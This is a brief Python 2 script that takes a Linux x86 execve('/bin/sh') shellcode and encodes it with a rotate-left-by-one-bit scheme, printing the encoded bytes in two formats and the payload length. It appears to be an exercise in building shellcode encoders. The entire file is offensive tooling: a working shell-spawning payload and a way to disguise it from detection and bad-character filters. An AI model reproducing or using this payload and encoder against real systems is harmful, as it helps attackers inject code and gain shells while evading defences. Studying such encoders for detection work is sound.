#!/usr/bin/python
shellcode = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62"
shellcode += "\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1"
shellcode += "\xb0\x0b\xcd\x80"
encoded1 = ""
encoded2 = ""
for x in bytearray(shellcode) :
    if x > 127:
        x = x - 128             # Remove the left-most bit
        x = x << 1              # Shift to the left 1
        x += 1                  # Add 1, to complete the rotate
        encoded1 += '\\x'
        encoded1 += '%02x' %x   # Add the rotated left hex to string 
        encoded2 += '0x'
        encoded2 += '%02x,' %x  # Add the rotated left hex to string 
    else:
        encoded1 += '\\x'       # No leftmost bit, just rotate
        encoded1 += '%02x' %(x << 1)
        encoded2 += '0x'        # No leftmost bit, just rotate
        encoded2 += '%02x,' %(x << 1)
print encoded1
print encoded2
print 'Len: %d' % len(bytearray(shellcode))
